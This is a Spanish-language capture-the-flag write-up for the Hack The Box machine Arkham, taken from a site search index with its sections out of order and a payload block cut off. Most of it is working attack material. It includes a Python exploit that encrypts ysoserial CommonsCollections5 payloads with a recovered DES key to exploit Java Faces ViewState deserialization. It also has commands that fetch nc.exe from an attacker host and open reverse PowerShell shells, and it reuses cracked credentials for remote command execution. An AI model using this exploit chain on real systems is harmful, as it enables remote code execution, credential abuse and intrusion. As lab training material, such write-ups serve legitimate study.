\\x74\\x00\\x04\\x65\\x78\\x65\\x63\\x75\\x71\\x00\\x7e\\x00\\x2f\\x00\\x00\\x00\\x01 ' payload += b ' \\x71\\x00\\x7e\\x00\\x34\\x73\\x71\\x00\\x7e\\x00\\x24\\x73\\x72\\x00\\x11\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x49\\x6e\\x74\\x65\\x67 ' payload += b ' \\x65\\x72\\x12\\xe2\\xa0\\xa4\\xf7\\x81\\x87\\x38\\x02\\x00\\x01\\x49\\x00\\x05\\x76\\x61\\x6c\\x75\\x65\\x78\\x72\\x00\\x10\\x6a\\x61\\x76\\x61\\x2e ' payload += b ' \\x6c\\x61\\x6e\\x67\\x2e\\x4e\\x75\\x6d\\x62\\x65\\x72\\x86\\xac\\x95\\x1d\\x0b\\x94\\xe0\\x8b\\x02\\x00\\x00\\x78\\x70\\x00\\x00\\x00\\x01\\x73\\x72 ' payload += b ' \\x00\\x11\\x6a\\x61\\x76\\x61\\x2e\\x75\\x74\\x69\\x6c\\x2e\\x48\\x61\\x73\\x68\\x4d\\x61\\x70\\x05\\x07\\xda\\xc1\\xc3\\x16\\x60\\xd1\\x03\\x00\\x02 ' payload += b ' \\x46\\x00\\x0a\\x6c\\x6f\\x61\\x64\\x46\\x61\\x63\\x74\\x6f\\x72\\x49\\x00\\x09\\x74\\x68\\x72\\x65\\x73\\x68\\x6f\\x6c\\x64\\x78\\x70\\x3f\\x40\\x00 ' payload += b ' \\x00\\x00\\x00\\x00\\x00\\x77\\x08\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x78\\x78 ' return encrypt_data ( payload ) def encrypt_data ( payload ): key = b64decode ( 'SnNGOTg3Ni0=' ) obj = pyDes . des ( key , pyDes . ECB , padmode = pyDes . PAD_PKCS5 ) encryted_data = obj . encrypt ( payload ) hash_value = ( hmac . new ( key , bytes ( encryted_data ), sha1 ) . digest ()) encrypted_view_state = encryted_data + hash_value return b64encode ( encrypted_view_state ) def decrypt_view_state ( viewstate ): key = b64decode ( 'SnNGOTg3Ni0=' ) viewstate = b64decode ( viewstate ) #Padding para hacer viewstate multiplo de 8 padding = b ' \\x00\\x00\\x00\\x00 ' viewstate += padding obj = pyDes . des ( key , pyDes . ECB , padmode = pyDes . PAD_PKCS5 ) view_state_decrypted = obj . decrypt ( viewstate ) return view_state_decrypted def exploit ( cmd ): viewstate = createpayload ( cmd ) data = { 'javax.faces.ViewState' : viewstate } r = requests . post ( url , data = data ) print ( r . text ) if __name__ == '__main__' : #print(decrypt_view_state(\"wHo0wmLu5ceItIi+I7XkEi1GAb4h12WZ894pA+Z4OH7bco2jXEy1RUcOXXNAvTSC70KtDtngjDm0mNzA9qHjYerxo0jW7zu1a6WhnEtXrTblezs7Z7sOU6L5UMg=\")) while True : cmd = input ( \"> \" ) exploit ( cmd ) Se sube un netcat al equipo: netcat 1.12 rlwrap python decryptor2.py cmd /c powershell iwr http://10.10.14.11/nc.exe -outfile c:\\\\windows\\\\temp\\\\nc.exe cmd /c c:\\\\windows\\\\temp\\\\nc.exe -e powershell 10.10.14.11 443 PS C:\\tomcat\\apache-tomcat-8.5.37\\bin> whoami arkham\\alfred PS C:\\users\\alfred\\desktop> type user.txt ba659321c89c48a3dcb915bc46d58071 Escalate Privileges Se inspeccionan los recursos de la m\u00e1quina: PS C :\\ users \\ alfred \\ Downloads \\ backups > cp backup . zip \\\\ 10 . 10 . 14 . 11 \\ recurso \\ backup2 . zip Parece que da problemas, probamos a encodearlo con certutil: certutil.exe -encode backup.zip C:\\Windows\\Temp\\encodedata Input Length = 124257 Output Length = 170910 CertUtil: -encode command completed successfully. El backup contiene un ost, se puede abrir con readpst : readpst alfred@arkham.local.ost Opening PST file and indexes... Processing Folder \"Deleted Items\" Processing Folder \"Inbox\" Processing Folder \"Outbox\" Processing Folder \"Sent Items\" Processing Folder \"Calendar\" Processing Folder \"Contacts\" Processing Folder \"Conversation Action Settings\" Processing Folder \"Drafts\" \"Calendar\" - 0 items done, 3 items skipped. Processing Folder \"Journal\" Processing Folder \"Junk E-Mail\" Processing Folder \"Notes\" Processing Folder \"Tasks\" Processing Folder \"Sync Issues\" Processing Folder \"RSS Feeds\" Processing Folder \"Quick Step Settings\" \"alfred@arkham.local.ost\" - 15 items done, 0 items skipped. \"Inbox\" - 0 items done, 7 items skipped. \"Drafts\" - 1 items done, 0 items skipped. Processing Folder \"Conflicts\" Processing Folder \"Local Failures\" Processing Folder \"Server Failures\" \"Sync Issues\" - 3 items done, 0 items skipped. Se encuentra una imagen en base64 con credenciales: batman:Zx^#QZX+T!123 cme smb 10 .10.10.130 --shares -u 'batman' -p 'Zx^#QZX+T!123' SMB 10 .10.10.130 445 ARKHAM [ * ] Windows 10 .0 Build 17763 x64 ( name:ARKHAM ) ( domain:ARKHAM ) ( signing:False ) ( SMBv1:False ) SMB 10 .10.10.130 445 ARKHAM [ + ] ARKHAM \\b atman:Zx^#QZX+T!123 SMB 10 .10.10.130 445 ARKHAM [ + ] Enumerated shares SMB 10 .10.10.130 445 ARKHAM Share Permissions Remark SMB 10 .10.10.130 445 ARKHAM ----- ----------- ------ SMB 10 .10.10.130 445 ARKHAM ADMIN$ Remote Admin SMB 10 .10.10.130 445 ARKHAM BatShare Master Wayne 's secrets SMB 10.10.10.130 445 ARKHAM C$ Default share SMB 10.10.10.130 445 ARKHAM IPC$ READ Remote IPC SMB 10.10.10.130 445 ARKHAM Users READ smbclient \\\\\\\\10.10.10.130\\\\Users -U batman Enter WORKGROUP\\batman' s password: Ejecutamos script con las credenciales de Batman: $secPass = ConvertTo-SecureString 'Zx^#QZX+T!123' -AsPlainText -Force $cred = New-Object System . Management . Automation . PSCredential ( 'ARKHAM\\batman' , $secPass ) Invoke-Command -ComputerName ARKHAM -Credential $cred -ScriptBlock { whoami } Invoke-Command -ComputerName ARKHAM -Credential $cred -ScriptBlock { cmd / c c :\\ temp \\ nc . exe -e powershell 10 . 10 . 14 . 11 8443 } Batman est\u00e1 dentro del grupo administradores, pero est\u00e1 capado, se puede realizar este bypass: net use z : \\\\ ARKHAM \\ c $ The command completed successfully . cat z :\\ users \\ administrator \\ desktop \\ root . txt 636783f913109f2809701e8545ef4fdb","title":"Arkham"},{"location":"maquinas/windows/arkham/#arkham-htb","text":"","title":"Arkham HTB"},{"location":"maquinas/windows/arkham/#recon","text":"Se comprueba que la m\u00e1quina est\u00e1 activa: ping 10.10.10.130","title":"Recon"},{"location":"maquinas/windows/arkham/#enum","text":"Se realiza un scan de los 65535 puertos TCP: nmap -sS -Pn -p- -n --open --min-rate 5000 -oG allPorts 10.10.10.130 Se realiza un scan de los puertos abiertos: nmap -sVC -p80,135,139,445,8080,49666,49667 10.10.10.130 -oN openPorts Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-06 18:29 CEST Nmap scan report for 10.10.10.130 Host is up (0.045s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-title: IIS Windows Server | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 8080/tcp open http Apache Tomcat 8.5.37 |_http-title: Mask Inc. | http-methods: |_ Potentially risky methods: PUT DELETE 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required | smb2-time: | date: 2022-08-06T16:30:27 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 95.53 seconds","title":"Enum"},{"location":"maquinas/windows/arkham/#enumeracion-smb","text":"Se enumera los recursos samba con null session: smbclient -L 10.10.10.130 -N Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin BatShare Disk Master Wayne's secrets C$ Disk Default share IPC$ IPC Remote IPC Users Disk CME da mas info: cme smb 10.10.10.130 -u 'guest' -p '' --shares SMB 10.10.10.130 445 ARKHAM [*] Windows 10.0 Build 17763 x64 (name:ARKHAM) (domain:ARKHAM) (signing:False) (SMBv1:False) SMB 10.10.10.130 445 ARKHAM [+] ARKHAM\\guest: SMB 10.10.10.130 445 ARKHAM [+] Enumerated shares SMB 10.10.10.130 445 ARKHAM Share Permissions Remark SMB 10.10.10.130 445 ARKHAM ----- ----------- ------ SMB 10.10.10.130 445 ARKHAM ADMIN$ Remote Admin SMB 10.10.10.130 445 ARKHAM BatShare READ Master Wayne's secrets SMB 10.10.10.130 445 ARKHAM C$ Default share SMB 10.10.10.130 445 ARKHAM IPC$ READ Remote IPC SMB 10.10.10.130 445 ARKHAM Users READ Exfiltramos informaci\u00f3n: smbclient \\\\\\\\10.10.10.130\\\\BatShare -N Try \"help\" to get a list of possible commands. smb: \\> dir . D 0 Sun Feb 3 14:00:10 2019 .. D 0 Sun Feb 3 14:00:10 2019 appserver.zip A 4046695 Fri Feb 1 07:13:37 2019 smb: \\> get appserver.zip getting file \\appserver.zip of size 4046695 as appserver.zip (2028,7 KiloBytes/sec) (average 2028,7 KiloBytes/sec) Se revisa el contenido: unzip appserver.zip Archive: appserver.zip inflating: IMPORTANT.txt inflating: backup.img cat IMPORTANT.txt \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2502 File: IMPORTANT.txt \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 1 \u2502 Alfred, this is the backup image from our linux server. Please see that The Joker or anyone else doesn't have unauthenticated access to it. - Bruce \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Se intenta montar el volumen pero est\u00e1 cifrado: cryptsetup open --type luks /home/x/Documentos/htb/arkham/backup/backup.img puto Introduzca la frase contrase\u00f1a de /home/x/Documentos/htb/arkham/backup/backup.img: No hay ninguna clave disponible con esa frase contrase\u00f1a.","title":"Enumeraci\u00f3n SMB"},{"location":"maquinas/windows/arkham/#cracking-luks","text":"Usamos la siguiente utilidad: Bruteforce-luks bruteforce-luks -f ./batman.dic backup.img -t 3 -v 1 Tried passwords: 60 Tried passwords per second: 0,759494 Last tried password: batman54 Password found: batmanforever Y se monta el volumen (se encuentra la key que cifra la data serializada): cryptsetup open --type luks /home/x/Documentos/htb/arkham/backup/backup.img puto Introduzca la frase contrase\u00f1a de /home/x/Documentos/htb/arkham/backup/backup.img: **batmanforever** mount /dev/mapper/puto backup","title":"Cracking luks"},{"location":"maquinas/windows/arkham/#deserilializacion-java-faces","text":"Se puede ver un caso de data serializada sin cifrar de ejemplo y la otra cifrada de nuestra maquina objetivo: Magic numbers de objeto serializado (aced 0005) echo -n 'rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s' | base64 -d | xxd 00000000: aced 0005 7572 0013 5b4c 6a61 7661 2e6c ....ur..[Ljava.l 00000010: 616e 672e 4f62 6a65 6374 3b90 ce58 9f10 ang.Object;..X.. 00000020: 7329 6c02 0000 7870 0000 0002 7074 000c s)l...xp....pt.. 00000030: 2f6c 6f67 696e 2e78 6874 6d6c /login.xhtml echo -n 'wHo0wmLu5ceItIi+I7XkEi1GAb4h12WZ894pA+Z4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE=' | base64 -d | xxd 00000000: c07a 34c2 62ee e5c7 88b4 88be 23b5 e412 .z4.b.......#... 00000010: 2d46 01be 21d7 6599 f3de 2903 e678 387e -F..!.e...)..x8~ 00000020: db72 8da3 5c4c b545 0c53 a8b6 2ea2 498e .r..\\L.E.S....I. 00000030: ef42 ad0e d9e0 8c39 b498 dcc0 f6a1 e361 .B.....9.......a 00000040: eaf1 a348 d6ef 3bb5 99d2 815e dc67 4f54 ...H..;....^.gOT 00000050: 669d 6516 4c9c 82b8 d709 bb11 f.e.L....... Crear payload serializado: java -jar /opt/ysoserial/ysoserial-all.jar CommonsCollections5 'cmd /c ping -n 1 10.10.14.11' > payload.bin Se ha generado correctamente, magig number aced 0005 : cat payload.bin| xxd 00000000: aced 0005 7372 002e 6a61 7661 782e 6d61 ....sr..javax.ma 00000010: 6e61 6765 6d65 6e74 2e42 6164 4174 7472 nagement.BadAttr 00000020: 6962 7574 6556 616c 7565 4578 7045 7863 ibuteValueExpExc Script en python decryptor.py para cifrar nuestros payloads serializados: #!/usr/bin/python3 import requests import pyDes , hmac import signal import time , sys from hashlib import sha1 from base64 import b64encode , b64decode def def_handler ( sig , frame ): print ( \" \\n\\n [+] Saliendo... \\n \" ) sys . exit ( 1 ) # Ctrl+C signal . signal ( signal . SIGINT , def_handler ) # Variables globales url = \"http://10.10.10.130:8080/userSubscribe.faces\" def createpayload (): payload = open ( 'payload.bin' , 'rb' ) . read () return encrypt_data ( payload ) def encrypt_data ( payload ): key = b64decode ( 'SnNGOTg3Ni0=' ) obj = pyDes . des ( key , pyDes . ECB , padmode = pyDes . PAD_PKCS5 ) encryted_data = obj . encrypt ( payload ) hash_value = ( hmac . new ( key , bytes ( encryted_data ), sha1 ) . digest ()) encrypted_view_state = encryted_data + hash_value return b64encode ( encrypted_view_state ) def decrypt_view_state ( viewstate ): key = b64decode ( 'SnNGOTg3Ni0=' ) viewstate = b64decode ( viewstate ) #Padding para hacer viewstate multiplo de 8 padding = b ' \\x00\\x00\\x00\\x00 ' viewstate += padding obj = pyDes . des ( key , pyDes . ECB , padmode = pyDes . PAD_PKCS5 ) view_state_decrypted = obj . decrypt ( viewstate ) return view_state_decrypted def exploit (): viewstate = createpayload () data = { 'javax.faces.ViewState' : viewstate } r = requests . post ( url , data = data ) print ( r . text ) if __name__ == '__main__' : #print(decrypt_view_state(\"wHo0wmLu5ceItIi+I7XkEi1GAb4h12WZ894pA+Z4OH7bco2jXEy1RUcOXXNAvTSC70KtDtngjDm0mNzA9qHjYerxo0jW7zu1a6WhnEtXrTblezs7Z7sOU6L5UMg=\")) exploit ()","title":"Deserilializaci\u00f3n Java Faces"},{"location":"maquinas/windows/arkham/#exploit-mejorado","text":"Pasamos nuestro payload a hexadecimal para trabajar con python, unicamente introducimos dos variantes la longitud del comando y el comando por un input: for line in $( xxd -p payload.bin | sed 's/../\\\\x&/g' ) ; do echo \"payload += b' $line '\" ; done payload += b '\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x2e\\x6a\\x61\\x76\\x61\\x78\\x2e\\x6d\\x61\\x6e\\x61\\x67\\x65\\x6d\\x65\\x6e\\x74\\x2e\\x42\\x61\\x64\\x41\\x74' payload += b '\\x74\\x72\\x69\\x62\\x75\\x74\\x65\\x56\\x61\\x6c\\x75\\x65\\x45\\x78\\x70\\x45\\x78\\x63\\x65\\x70\\x74\\x69\\x6f\\x6e\\xd4\\xe7\\xda\\xab\\x63\\x2d' payload += b '\\x46\\x40\\x02\\x00\\x01\\x4c\\x00\\x03\\x76\\x61\\x6c\\x74\\x00\\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x4f\\x62\\x6a\\x65\\x63' payload += b '\\x74\\x3b\\x78\\x72\\x00\\x13\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x45\\x78\\x63\\x65\\x70\\x74\\x69\\x6f\\x6e\\xd0\\xfd\\x1f\\x3e\\x1a' payload += b '\\x3b\\x1c\\xc4\\x02\\x00\\x00\\x78\\x72\\x00\\x13\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x54\\x68\\x72\\x6f\\x77\\x61\\x62\\x6c\\x65\\xd5' payload += b '\\xc6\\x35\\x27\\x39\\x77\\xb8\\xcb\\x03\\x00\\x04\\x4c\\x00\\x05\\x63\\x61\\x75\\x73\\x65\\x74\\x00\\x15\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e' payload += b '\\x67\\x2f\\x54\\x68\\x72\\x6f\\x77\\x61\\x62\\x6c\\x65\\x3b\\x4c\\x00\\x0d\\x64\\x65\\x74\\x61\\x69\\x6c\\x4d\\x65\\x73\\x73\\x61\\x67\\x65\\x74\\x00' payload += b '\\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x5b\\x00\\x0a\\x73\\x74\\x61\\x63\\x6b\\x54\\x72\\x61' #!/usr/bin/python3 import requests import pyDes , hmac import signal import time , sys from hashlib import sha1 from base64 import b64encode , b64decode def def_handler ( sig , frame ): print ( \" \\n\\n [+] Saliendo... \\n \" ) sys . exit ( 1 ) # Ctrl+C signal . signal ( signal . SIGINT , def_handler ) # Variables globales url = \"http://10.10.10.130:8080/userSubscribe.faces\" def createpayload ( cmd ): #payload = open('payload.bin','rb').read() payload = b '' payload += b ' \\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x2e\\x6a\\x61\\x76\\x61\\x78\\x2e\\x6d\\x61\\x6e\\x61\\x67\\x65\\x6d\\x65\\x6e\\x74\\x2e\\x42\\x61\\x64\\x41\\x74 ' payload += b ' \\x74\\x72\\x69\\x62\\x75\\x74\\x65\\x56\\x61\\x6c\\x75\\x65\\x45\\x78\\x70\\x45\\x78\\x63\\x65\\x70\\x74\\x69\\x6f\\x6e\\xd4\\xe7\\xda\\xab\\x63\\x2d ' payload += b ' \\x46\\x40\\x02\\x00\\x01\\x4c\\x00\\x03\\x76\\x61\\x6c\\x74\\x00\\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x4f\\x62\\x6a\\x65\\x63 ' payload += b ' \\x74\\x3b\\x78\\x72\\x00\\x13\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x45\\x78\\x63\\x65\\x70\\x74\\x69\\x6f\\x6e\\xd0\\xfd\\x1f\\x3e\\x1a ' payload += b ' \\x3b\\x1c\\xc4\\x02\\x00\\x00\\x78\\x72\\x00\\x13\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x54\\x68\\x72\\x6f\\x77\\x61\\x62\\x6c\\x65\\xd5 ' payload += b ' \\xc6\\x35\\x27\\x39\\x77\\xb8\\xcb\\x03\\x00\\x04\\x4c\\x00\\x05\\x63\\x61\\x75\\x73\\x65\\x74\\x00\\x15\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e ' payload += b ' \\x67\\x2f\\x54\\x68\\x72\\x6f\\x77\\x61\\x62\\x6c\\x65\\x3b\\x4c\\x00\\x0d\\x64\\x65\\x74\\x61\\x69\\x6c\\x4d\\x65\\x73\\x73\\x61\\x67\\x65\\x74\\x00 ' payload += b ' \\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x5b\\x00\\x0a\\x73\\x74\\x61\\x63\\x6b\\x54\\x72\\x61 ' payload += b ' \\x63\\x65\\x74\\x00\\x1e\\x5b\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x61\\x63\\x6b\\x54\\x72\\x61\\x63\\x65\\x45\\x6c\\x65 ' payload += b ' \\x6d\\x65\\x6e\\x74\\x3b\\x4c\\x00\\x14\\x73\\x75\\x70\\x70\\x72\\x65\\x73\\x73\\x65\\x64\\x45\\x78\\x63\\x65\\x70\\x74\\x69\\x6f\\x6e\\x73\\x74\\x00 ' payload += b ' \\x10\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x75\\x74\\x69\\x6c\\x2f\\x4c\\x69\\x73\\x74\\x3b\\x78\\x70\\x71\\x00\\x7e\\x00\\x08\\x70\\x75\\x72\\x00\\x1e\\x5b ' payload += b ' \\x4c\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x53\\x74\\x61\\x63\\x6b\\x54\\x72\\x61\\x63\\x65\\x45\\x6c\\x65\\x6d\\x65\\x6e\\x74\\x3b\\x02 ' payload += b ' \\x46\\x2a\\x3c\\x3c\\xfd\\x22\\x39\\x02\\x00\\x00\\x78\\x70\\x00\\x00\\x00\\x03\\x73\\x72\\x00\\x1b\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e ' payload += b ' \\x53\\x74\\x61\\x63\\x6b\\x54\\x72\\x61\\x63\\x65\\x45\\x6c\\x65\\x6d\\x65\\x6e\\x74\\x61\\x09\\xc5\\x9a\\x26\\x36\\xdd\\x85\\x02\\x00\\x08\\x42\\x00 ' payload += b ' \\x06\\x66\\x6f\\x72\\x6d\\x61\\x74\\x49\\x00\\x0a\\x6c\\x69\\x6e\\x65\\x4e\\x75\\x6d\\x62\\x65\\x72\\x4c\\x00\\x0f\\x63\\x6c\\x61\\x73\\x73\\x4c\\x6f ' payload += b ' \\x61\\x64\\x65\\x72\\x4e\\x61\\x6d\\x65\\x71\\x00\\x7e\\x00\\x05\\x4c\\x00\\x0e\\x64\\x65\\x63\\x6c\\x61\\x72\\x69\\x6e\\x67\\x43\\x6c\\x61\\x73\\x73 ' payload += b ' \\x71\\x00\\x7e\\x00\\x05\\x4c\\x00\\x08\\x66\\x69\\x6c\\x65\\x4e\\x61\\x6d\\x65\\x71\\x00\\x7e\\x00\\x05\\x4c\\x00\\x0a\\x6d\\x65\\x74\\x68\\x6f\\x64 ' payload += b ' \\x4e\\x61\\x6d\\x65\\x71\\x00\\x7e\\x00\\x05\\x4c\\x00\\x0a\\x6d\\x6f\\x64\\x75\\x6c\\x65\\x4e\\x61\\x6d\\x65\\x71\\x00\\x7e\\x00\\x05\\x4c\\x00\\x0d ' payload += b ' \\x6d\\x6f\\x64\\x75\\x6c\\x65\\x56\\x65\\x72\\x73\\x69\\x6f\\x6e\\x71\\x00\\x7e\\x00\\x05\\x78\\x70\\x01\\x00\\x00\\x00\\x51\\x74\\x00\\x03\\x61\\x70 ' payload += b ' \\x70\\x74\\x00\\x26\\x79\\x73\\x6f\\x73\\x65\\x72\\x69\\x61\\x6c\\x2e\\x70\\x61\\x79\\x6c\\x6f\\x61\\x64\\x73\\x2e\\x43\\x6f\\x6d\\x6d\\x6f\\x6e\\x73 ' payload += b ' \\x43\\x6f\\x6c\\x6c\\x65\\x63\\x74\\x69\\x6f\\x6e\\x73\\x35\\x74\\x00\\x18\\x43\\x6f\\x6d\\x6d\\x6f\\x6e\\x73\\x43\\x6f\\x6c\\x6c\\x65\\x63\\x74\\x69 ' payload += b ' \\x6f\\x6e\\x73\\x35\\x2e\\x6a\\x61\\x76\\x61\\x74\\x00\\x09\\x67\\x65\\x74\\x4f\\x62\\x6a\\x65\\x63\\x74\\x70\\x70\\x73\\x71\\x00\\x7e\\x00\\x0b\\x01 ' payload += b ' \\x00\\x00\\x00\\x33\\x71\\x00\\x7e\\x00\\x0d\\x71\\x00\\x7e\\x00\\x0e\\x71\\x00\\x7e\\x00\\x0f\\x71\\x00\\x7e\\x00\\x10\\x70\\x70\\x73\\x71\\x00\\x7e ' payload += b ' \\x00\\x0b\\x01\\x00\\x00\\x00\\x22\\x71\\x00\\x7e\\x00\\x0d\\x74\\x00\\x19\\x79\\x73\\x6f\\x73\\x65\\x72\\x69\\x61\\x6c\\x2e\\x47\\x65\\x6e\\x65\\x72 ' payload += b ' \\x61\\x74\\x65\\x50\\x61\\x79\\x6c\\x6f\\x61\\x64\\x74\\x00\\x14\\x47\\x65\\x6e\\x65\\x72\\x61\\x74\\x65\\x50\\x61\\x79\\x6c\\x6f\\x61\\x64\\x2e\\x6a ' payload += b ' \\x61\\x76\\x61\\x74\\x00\\x04\\x6d\\x61\\x69\\x6e\\x70\\x70\\x73\\x72\\x00\\x1f\\x6a\\x61\\x76\\x61\\x2e\\x75\\x74\\x69\\x6c\\x2e\\x43\\x6f\\x6c\\x6c ' payload += b ' \\x65\\x63\\x74\\x69\\x6f\\x6e\\x73\\x24\\x45\\x6d\\x70\\x74\\x79\\x4c\\x69\\x73\\x74\\x7a\\xb8\\x17\\xb4\\x3c\\xa7\\x9e\\xde\\x02\\x00\\x00\\x78\\x70 ' payload += b ' \\x78\\x73\\x72\\x00\\x34\\x6f\\x72\\x67\\x2e\\x61\\x70\\x61\\x63\\x68\\x65\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x73\\x2e\\x63\\x6f\\x6c\\x6c\\x65\\x63 ' payload += b ' \\x74\\x69\\x6f\\x6e\\x73\\x2e\\x6b\\x65\\x79\\x76\\x61\\x6c\\x75\\x65\\x2e\\x54\\x69\\x65\\x64\\x4d\\x61\\x70\\x45\\x6e\\x74\\x72\\x79\\x8a\\xad\\xd2 ' payload += b ' \\x9b\\x39\\xc1\\x1f\\xdb\\x02\\x00\\x02\\x4c\\x00\\x03\\x6b\\x65\\x79\\x71\\x00\\x7e\\x00\\x01\\x4c\\x00\\x03\\x6d\\x61\\x70\\x74\\x00\\x0f\\x4c\\x6a ' payload += b ' \\x61\\x76\\x61\\x2f\\x75\\x74\\x69\\x6c\\x2f\\x4d\\x61\\x70\\x3b\\x78\\x70\\x74\\x00\\x03\\x66\\x6f\\x6f\\x73\\x72\\x00\\x2a\\x6f\\x72\\x67\\x2e\\x61 ' payload += b ' \\x70\\x61\\x63\\x68\\x65\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x73\\x2e\\x63\\x6f\\x6c\\x6c\\x65\\x63\\x74\\x69\\x6f\\x6e\\x73\\x2e\\x6d\\x61\\x70\\x2e ' payload += b ' \\x4c\\x61\\x7a\\x79\\x4d\\x61\\x70\\x6e\\xe5\\x94\\x82\\x9e\\x79\\x10\\x94\\x03\\x00\\x01\\x4c\\x00\\x07\\x66\\x61\\x63\\x74\\x6f\\x72\\x79\\x74\\x00 ' payload += b ' 